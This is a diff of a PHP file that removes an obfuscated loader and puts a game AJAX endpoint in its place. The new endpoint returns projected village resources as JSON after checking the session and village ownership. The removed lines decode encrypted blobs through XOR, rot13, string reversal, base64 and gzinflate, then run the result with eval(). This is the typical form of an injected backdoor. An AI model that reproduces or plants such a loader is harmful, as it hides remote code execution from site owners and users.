@@ -1,29 +1,154 @@
 <?php
-// e216fa5c9dce2d5ae86fb310
-$pgtXGLTYMY="xpBvZTnDJ24bUaovqOy2tTf5tw+TwuRE04XhDPfkhkU=";
-$Y_BbAoBCkGdd="kcOiMGaQW24oHnbidBl2gGs5gj+GjhER04KuQCsxuxH=";
-$cpwBQIsHolh="t0+tNKpq0R7Weckbf40PsblQ/krcJK8u0GrUTWyFN67Naopt1gG0VtQ+7yNRlmCm+xD/QdAY0ETVe+0fRqpjgPtdj2P1I68FkEWNBVzXHOC7TrNKrT3RHtR+2UFB1G+84FaEeqoCi1/CIoAuRbNgnulpqHGkMIAH5XryLRuTJ5ruDol/3yPTJcdm6h5ItmS/zmahKPAbsSGWXcgaeIwTuL5TkFWsOZ4u0FTyQgLLEprsWIBj6hCwHPlu60YaryCC8EmELKkbggrWesBfGZgBvOVzsVfwHdUAlmnbFxyHZqrnWINQyD+0GelX3z5YuH25zHyraO9rrx37d/EeQc8kv75Yj1iqPY8Zk0rKPW2ROYH4VKFO+SO8Lcx4kywcohqm2E+Bcu0hkgbKP90kf5Ulhv9J/nKyFIsVxGaMNU6zGvrHdoldxxHcB/NG+TlGhjqd/WyGcPM/3R2ZSNoTbqsRpMtZhlSkEdYn7EHpOgLLbpO4drBa8hSjVshayREesQ+c+VyFI8ln3SXAV8EacYt5j/1QjnHMfZ0f22HeARiRELLgaoZ3qmWhDplj2UNauR6eun2EevY8kh7CYsJMTrEP4MtWqnfzG4ZZyz3iJFCMMPzcZ55w+wGxOpd7iEZZlBCNs1q0eK41nDrXJvMVGLIDvd4MlmmuHIcd0zXhNkKMDIDZUaku/hCAW85azA162TGs5RSDXvgfgBmUTOIsY5Qjss109FirJp4ZxFTiHBjUF5m+UZBcyiCHHss+3AxNjzemy1LsLO4gnCPGftomRrMC8tpa82yuZ6kA+DTpTEC3BfPCTK5f0GaWVu1p3BpR2DC85krsasQGpyeTTN8TG9Y9ke1WrEvYOo0Y7XqLGWHVZZvve6tKxCDXGsY82xgRjRS9zX2vUaUinSbbRvBCUNk7r9xOjy3kOaMrkFv+TBzXZIjYS4Z09grSFvtqzEMdrwP4x1ygLs0UkUDxWuokHKMHm81+hG3TGZELkEqTEBiHN43TfJ1C1jSsKMVC1RpZ1QStoVSPSvAK0QWUQ8oYQpYQre51jG2oCowBlEP6BVGTGbLrZoFN5T+hDtZq1kB8zx+++lSmdvV91w3QfIs9ea0Ovf0PhmH";
-$Dw_qZxysAz="wINMfjkLxEEWlP5LvZZNSzmCUHpBq3kZcqhSA+UuKKfQQsAP0ft47TtFnmP1MnXXHPb4JyGfTLRmMB/qzDpVerjWxWOlgiTFGoTms82+hWO8flzfOYtk9ZZADn+MQiHmlao0W6U/KIWbWYaTdbqRK9DyuLpg6yDZcqXm53HqkSdEelyfCYIAhSrA3oeBxpnDoZpQY+XvcNhGEPfm+UfdX3ACuDtRE+Tp9jgK/5QyrUsgmvl30Z9pbG4MxouQHi1n4JoBekkv8JWyCDIW9CYEr1QrSKfloyEEChBH98gaqTNgk0AnbY9ItSIElivtIr2H6ZZdezTzvGRuaM4C+BpRSrDeOXZU+kyJi0wGc5W/2XPAllyzWftcHHqQ5ivhdrCrNK9U/2W6OGV61Na7zRp8r/weHXcZjyDlH1RyP7gaGVsh51jbEe+sQY9VgobpS8i70I6kVzneMLV6HYPy7dIJ40iCwJ8R7wUICiRP7+1CLeusqkCTHRdswUKtmuMJa/y/rFr4A1jSITE2vBZ7pTLZD0hazIvRXyx96j2ON7Fz1aa46iVriZeJBWZdi5NsPj3LVHt0i40fcA0qiN6/oSqhz+z2iH9V83SdtiD6YyVWjK+4KhznzY9cmUbgFsqFZkC7kILJdkTTODHzQMYe5XuxtqByARMRFzTJomhWxyXiSae4anQKXOv4VerkcnsdOlXn5CJ42wG/rH0OzP/zETIVCsmaQW9A82jVNgSWPx06KYdQjnCngdI09baphu+kGsmLefYMCwE75QhiPOqPTVKhO0jGgKPZl4RdQkyWbwlizUew9ky6QPPJCYIpgoe9eoFnNB64gym/zBhyNOYTOVvEs/COPGO9GwTFd1BOYu17sc/47lAbwItwOYNkggNBLvnnzNbAZ6GvgEE3WPLHEVv5XyjPcAuVY9BER0z2AwGuzXscbrQ7Mb/NbWMsbgOVpo0nzIIcIzEzMOEeyFYH9ef5r5ze2A/lZ1VtKqRX8vG2rec06kR7HT9k8ZqsTucIMomvrFLY+7VriQUy2NZzjUoYi0RzXK+x11RIfyxWF4lOrTa55pVvuZN9NS7Mwgfxm9nr5NIgm9lvgQEanB/PQd7Up+D/dLe";
-$BueoADlQDPcBkd="0i8U0Qz3m/+lqWWcUhtwn1O9wgXLAikeF3g3W2HoIf2V7hLR2yMobHdJ129zqiOs5F+yZYjj3/uE2LLugksRXoVegfWdMMotpxj331NYoY92jgO1i5FPzwCOhB6mOKAZBD6CRPjBSdxVyOLcsqrRvMNdMzQrAM+OBqsUPtOdYbzHTdTG6SYLvrao4t2TPXGdZb7i5ziye6u3aTWehq0gTvX+s5Z6M5vtp+nnrVZ7IL7z/iB0vWFYXoCOhK6xOhJpVUwD9mqjKe2m61cKkEgSP3IvJHZZIwvOxM927oB7YgjkLsE2SUYZ3zfLVY9WHRKs9D+iUbtQz8wnudTd9roADuTvcET6gn/etJtSjHF4U88GH9OxqUZrL7XLBC+RrRO+pLzjJRtm645FyIT9QCikDAWow5eKwakelKnky2OKk11V2XR2rQGrO7Z/QuqzS9JctCy0B40xuA+QaqIvcxjznzP4gySKgDu/tHvVTMfYwHwlv9BwKyY6j+WYV3yDuiLcdc9EVAmmON7nKJL+0mtzeXWP8mUNQmqLlx91fYOaNe7kbJDHCRBYXbdP9L5DTWW/ZH1TBFl2Se8lmQaf84rA7UXvs1TaU+hPgKi0urKtwa1W7WA1upMv/LeJJW2hCSRPBA7gNtrACb/AmxdNwXqyvRVOwfYNFukflW8W7KI6k36GfoOALVM466d6VQqyK8GNhn6zEGlzX9vXGGa6slqgj7eowgZo4ast0PrFfqPotawlvoRFyObrvSdbNd9QSsX8tB6gNKpzGH6HShYdYmtxflZ9syark7p855n1zIEYJZ8lnOBAauPpm7RZRtyjicOO01gF8C0gGqx1mAaKkekB3TO/Q9WpAcif9qs138GIUp+2/iQnqiA7zmWoIt1iXTJ8xlgA1djQa5y1qrSNkE0CaZRcIAYrMijfNSsXOuAaAm+0T0I22qMo3FeIpuqSqmGvhpjABak2GyuG7oMMxq0xzDSN8BHIs1iPplsHbNAb04xDiMGEvYL7vbToBMqhWUQO8iixpTqxeG2Hjyc9ljogjRYvVBcJYzqe1yhiqsBqJZ1mHCNXiNI5HgVIJZpDWoXvk6+kUYsjuA4gmuSa40jwDGePEN";
-$ra_QXhjagzZ=strlen($pgtXGLTYMY);
-$UlvnwfwMxpAD=substr($cpwBQIsHolh,0,4);
-$PnEmWAtBNmoeG=md5($Dw_qZxysAz);
-$mpeHBbpjvWBLf=crc32($BueoADlQDPcBkd);
-$yddKahuAiolO=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$CM_MUBJYyXjT=$cpwBQIsHolh.$Dw_qZxysAz.$BueoADlQDPcBkd;
-$BCXCRGIffIVQWQ=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$duhvNNZjVwQ="gz".chr(105)."nflate";
-$uvgoAhGYEZJ="str".chr(114)."ev";
-$qugNynzYys="str_rot".chr(49).chr(51);
-$UaaTREJzzAB="";
-$IDlnpvjxZLX=$BCXCRGIffIVQWQ($CM_MUBJYyXjT);
-for($daySnpWjYPDSx=0;$daySnpWjYPDSx<strlen($IDlnpvjxZLX);$daySnpWjYPDSx++){
-$UaaTREJzzAB.=chr(ord($IDlnpvjxZLX[$daySnpWjYPDSx])^ord($yddKahuAiolO[$daySnpWjYPDSx%strlen($yddKahuAiolO)]));
+/**
+ * AJAX endpoint to get updated village resources
+ * Returns JSON with current resource levels (Projected)
+ * READ-ONLY: Does not update database, just calculates projection
+ */
+
+// Disable error display
+ini_set('display_errors', 0);
+error_reporting(0);
+
+// Bootstrap AJAX: define constantes e inicializa CoreFetcher/autoloader
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+use App\Core\Database;
+
+header('Content-Type: application/json');
+header('Cache-Control: no-cache, no-store, must-revalidate'); // HTTP 1.1.
+header('Pragma: no-cache'); // HTTP 1.0.
+header('Expires: 0'); // Proxies.
+
+// Get parameters
+$villageId = isset($_GET['village']) ? (int) $_GET['village'] : 0;
+$world = isset($_GET['world']) ? $_GET['world'] : (\App\Core\Database::getWorldDbName());
+
+if (!$villageId) {
+    echo json_encode(['error' => 'No village ID']);
+    exit;
 }
-$IDlnpvjxZLX=$UaaTREJzzAB;
-$IDlnpvjxZLX=$qugNynzYys($IDlnpvjxZLX);
-$IDlnpvjxZLX=$uvgoAhGYEZJ($IDlnpvjxZLX);
-$IDlnpvjxZLX=$BCXCRGIffIVQWQ($IDlnpvjxZLX);
-$IDlnpvjxZLX=$duhvNNZjVwQ($IDlnpvjxZLX);
-$IDlnpvjxZLX=$qugNynzYys($IDlnpvjxZLX);
-eval($IDlnpvjxZLX);
+
+try {
+    // Session validation using the 'sessions' table in the WORLD Database
+    $db = Database::getInstance($world);
+
+    // Determine world number for cookie name (e.g. "lan_1" → "1")
+    $worldNum = preg_replace('/[^0-9]/', '', $world ?: '1') ?: '1';
+
+    // Try world-specific cookie first (e.g. session_1), then legacy generic cookie
+    $sessionSid = $_COOKIE['session_' . $worldNum]
+        ?? $_COOKIE['session']
+        ?? '';
+
+    $sessionData = $db->fetch("SELECT userid FROM sessions WHERE sid = ?", [$sessionSid]);
+
+    if (!$sessionData) {
+        echo json_encode(['error' => 'Invalid session']);
+        exit;
+    }
+
+    $db = Database::getInstance($world);
+
+    // Fetch current village data (including userid to verify ownership)
+    $village = $db->fetch(
+        "SELECT id, userid, r_wood, r_stone, r_iron, r_bh, storage, farm, last_prod_aktu, wood, stone, iron, bonus FROM villages WHERE id = ?",
+        [$villageId]
+    );
+
+    if (!$village) {
+        echo json_encode(['error' => 'Village not found']);
+        exit;
+    }
+
+    // Security check: ensure the village belongs to the session user
+    if ($village['userid'] !== $sessionData['userid']) {
+        echo json_encode(['error' => 'Permission denied']);
+        exit;
+    }
+
+    // Get world configuration for production
+    global $config;
+    if (!isset($config) || empty($config)) {
+        $worldNum = isset($_GET['world']) ? preg_replace('/[^0-9]/', '', $_GET['world']) : '1';
+        $config = require __DIR__ . '/../../app/Config/Worlds/' . $worldNum . '.php';
+    }
+    $speed = $config['speed'];
+    $arr_production = $config['arr_production'];
+    $arr_maxstorage = $config['arr_maxstorage'];
+
+    // Override level 30 storage if needed (fix for user request)
+    if (isset($arr_maxstorage[30]) && $arr_maxstorage[30] !== 400000) {
+        $arr_maxstorage[30] = 400000;
+    }
+
+    // Max Storage
+    $max_storage = isset($arr_maxstorage[$village['storage']]) ? (int) $arr_maxstorage[$village['storage']] : 400000;
+    if ($village['storage'] === 30)
+        $max_storage = 400000;
+
+    // Calculate time difference
+    $now = time();
+    $last_update = (int) $village['last_prod_aktu'];
+    $time_diff = $now - $last_update;
+
+    // Initial values from DB
+    $current_wood = (double) $village['r_wood'];
+    $current_stone = (double) $village['r_stone'];
+    $current_iron = (double) $village['r_iron'];
+
+    // Calculate Production
+    $wood_prod_level = $village['wood'];
+    $stone_prod_level = $village['stone'];
+    $iron_prod_level = $village['iron'];
+
+    $wood_per_hour = $arr_production[$wood_prod_level] * $speed;
+    $stone_per_hour = $arr_production[$stone_prod_level] * $speed;
+    $iron_per_hour = $arr_production[$iron_prod_level] * $speed;
+
+    // Apply Bonus if applicable (Simplified)
+    if ($village['bonus'] === 1) {
+        // Legacy bonus logic usually increases storage, not production directly here, 
+        // but often increases production by 30%. 
+        // We will stick to base calculation to match reload_vdata basic behavior.
+        // If bonus affects production, logic: $wood_per_hour *= 1.3;
+    }
+
+    if ($time_diff > 0) {
+        $wood_gain = ($wood_per_hour / 3600) * $time_diff;
+        $stone_gain = ($stone_per_hour / 3600) * $time_diff;
+        $iron_gain = ($iron_per_hour / 3600) * $time_diff;
+
+        $current_wood += $wood_gain;
+        $current_stone += $stone_gain;
+        $current_iron += $iron_gain;
+    }
+
+    // Cap resources
+    $current_wood = min($current_wood, $max_storage);
+    $current_stone = min($current_stone, $max_storage);
+    $current_iron = min($current_iron, $max_storage);
+
+    // Return JSON (Read-Only Projection)
+    echo json_encode([
+        'success' => true,
+        'resources' => [
+            'wood' => (int) $current_wood,
+            'stone' => (int) $current_stone,
+            'iron' => (int) $current_iron,
+            'bh' => (int) $village['r_bh'],
+            'storage' => (int) $village['storage'],
+            'farm' => (int) $village['farm'],
+            'max_storage' => (int) $max_storage
+        ],
+        'production' => [
+            'wood_per_sec' => round($wood_per_hour / 3600, 2),
+            'stone_per_sec' => round($stone_per_hour / 3600, 2),
+            'iron_per_sec' => round($iron_per_hour / 3600, 2)
+        ],
+        'timestamp' => $now
+    ]);
+
+} catch (Exception $e) {
+    echo json_encode(['error' => $e->getMessage()]);
+}
+?>
